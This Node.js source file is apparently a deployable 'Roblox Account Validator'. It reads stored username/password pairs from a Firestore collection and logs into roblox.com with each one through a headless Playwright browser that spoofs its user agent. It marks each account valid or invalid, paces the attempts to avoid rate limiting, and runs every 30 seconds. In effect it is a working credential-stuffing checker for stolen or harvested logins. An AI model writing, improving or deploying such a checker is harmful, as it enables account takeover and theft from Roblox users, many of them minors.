// ============================================================
//  Roblox Account Validator — Render-compatible (Fixed)
//  Fixes: --no-sandbox, playwright path, Firebase env support
// ============================================================

const express = require('express');
const cors = require('cors');
const path = require('path');
const cron = require('node-cron');
const admin = require('firebase-admin');
const { chromium } = require('playwright');

// ── Firebase Setup ───────────────────────────────────────────
let serviceAccount;
if (process.env.FIREBASE_CONFIG) {
  // Recommended: store JSON as an env variable in Render
  serviceAccount = JSON.parse(process.env.FIREBASE_CONFIG);
} else {
  // Fallback: local file (for testing on your own computer)
  serviceAccount = require('./oren-devs-firebase-adminsdk.json');
}

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
});

const db = admin.firestore();

// ── Express App ──────────────────────────────────────────────
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── In-memory Stats ──────────────────────────────────────────
let stats = { processed: 0, valid: 0, invalid: 0, error: 0 };
let isValidating = false;

// ── Playwright Launch Args (REQUIRED for Render free tier) ───
const BROWSER_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-dev-shm-usage',
  '--disable-accelerated-2d-canvas',
  '--disable-gpu',
  '--no-first-run',
  '--no-zygote',
  '--single-process',
  '--disable-extensions',
];

// ── Validate a Single Roblox Account ─────────────────────────
async function validateCredential(docId, username, password) {
  let browser = null;

  try {
    browser = await chromium.launch({
      headless: true,
      args: BROWSER_ARGS,
    });

    const context = await browser.newContext({
      userAgent:
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ' +
        '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      viewport: { width: 1280, height: 720 },
    });

    const page = await context.newPage();

    // Go to Roblox login page
    await page.goto('https://www.roblox.com/login', {
      waitUntil: 'networkidle',
      timeout: 30000,
    });

    // Fill in username
    await page.fill('#login-username', username);
    await page.fill('#login-password', password);

    // Click the login button
    await page.click('#login-button');

    // Wait for navigation or error
    await page.waitForTimeout(4000);

    const currentUrl = page.url();

    let resultStatus;

    if (currentUrl.includes('/home') || currentUrl === 'https://www.roblox.com/') {
      // Successfully logged in
      resultStatus = 'valid';
      stats.valid++;
      console.log(`✅ VALID: ${username}`);
    } else {
      // Check for error messages
      const errorVisible = await page
        .locator('#login-form .alert-warning, #login-form .text-danger, [data-testid="login-error"]')
        .isVisible()
        .catch(() => false);

      if (errorVisible) {
        resultStatus = 'invalid';
        stats.invalid++;
        console.log(`❌ INVALID: ${username}`);
      } else {
        // Unknown state — mark as error to retry later
        resultStatus = 'error';
        stats.error++;
        console.log(`⚠️  ERROR (unknown state): ${username} — URL: ${currentUrl}`);
      }
    }

    stats.processed++;

    // Update Firestore
    await db.collection('credentials').doc(docId).update({
      status: resultStatus,
      validated_at: admin.firestore.FieldValue.serverTimestamp(),
    });

    console.log(
      `📊 Stats: ${stats.processed} processed | ${stats.valid} valid | ${stats.invalid} invalid | ${stats.error} errors`
    );
  } catch (err) {
    console.error(`💥 Exception validating ${username}:`, err.message);

    // Mark as error so it can be retried
    await db
      .collection('credentials')
      .doc(docId)
      .update({
        status: 'error',
        error_message: err.message,
        validated_at: admin.firestore.FieldValue.serverTimestamp(),
      })
      .catch(() => {});

    stats.error++;
    stats.processed++;
  } finally {
    if (browser) await browser.close();
  }
}

// ── Process All Pending Credentials ──────────────────────────
async function processPending() {
  if (isValidating) {
    console.log('⏳ Already validating, skipping this cycle...');
    return;
  }

  try {
    isValidating = true;

    const snapshot = await db
      .collection('credentials')
      .where('status', '==', 'pending')
      .limit(5) // Process 5 at a time to avoid memory issues on free tier
      .get();

    if (snapshot.empty) {
      console.log('💤 No pending credentials found.');
      return;
    }

    console.log(`🔍 Found ${snapshot.size} pending credential(s). Processing...`);

    for (const doc of snapshot.docs) {
      const data = doc.data();
      const { username, password } = data;

      if (!username || !password) {
        console.warn(`⚠️  Skipping ${doc.id} — missing username or password`);
        await db.collection('credentials').doc(doc.id).update({ status: 'error', error_message: 'Missing username or password' });
        continue;
      }

      console.log(`📥 Processing: ${username}`);

      // Mark as processing so it won't be picked up again this cycle
      await db.collection('credentials').doc(doc.id).update({ status: 'processing' });

      await validateCredential(doc.id, username, password);

      // Small delay between accounts to avoid rate limiting
      await new Promise((r) => setTimeout(r, 2000));
    }
  } catch (err) {
    console.error('🔥 Error in processPending:', err.message);
  } finally {
    isValidating = false;
  }
}

// ── REST API Endpoints ────────────────────────────────────────

// GET /api/stats — Current validation stats
app.get('/api/stats', (req, res) => {
  res.json(stats);
});

// GET /api/pending — List pending credentials (passwords hidden)
app.get('/api/pending', async (req, res) => {
  try {
    const snapshot = await db
      .collection('credentials')
      .where('status', '==', 'pending')
      .limit(20)
      .get();

    const pending = snapshot.docs.map((doc) => {
      const data = doc.data();
      return {
        id: doc.id,
        username: data.username,
        password: '***',
        status: data.status,
        added_at: data.added_at,
      };
    });

    res.json(pending);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/all — All credentials with their statuses
app.get('/api/all', async (req, res) => {
  try {
    const snapshot = await db.collection('credentials').limit(100).get();

    const all = snapshot.docs.map((doc) => {
      const data = doc.data();
      return {
        id: doc.id,
        username: data.username,
        status: data.status,
        added_at: data.added_at,
        validated_at: data.validated_at || null,
      };
    });

    res.json(all);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /health — Health check for Render uptime monitoring
app.get('/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime(), stats });
});

// Fallback: serve index.html for all other routes
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── Cron Job — Every 30 Seconds ───────────────────────────────
cron.schedule('*/30 * * * * *', () => {
  console.log('⏰ Cron tick — checking for pending credentials...');
  processPending();
});

// ── Start Server ─────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📡 Dashboard: http://localhost:${PORT}`);
  console.log(`🔄 Validator will run every 30 seconds`);

  // Run immediately on startup
  setTimeout(processPending, 5000);
});
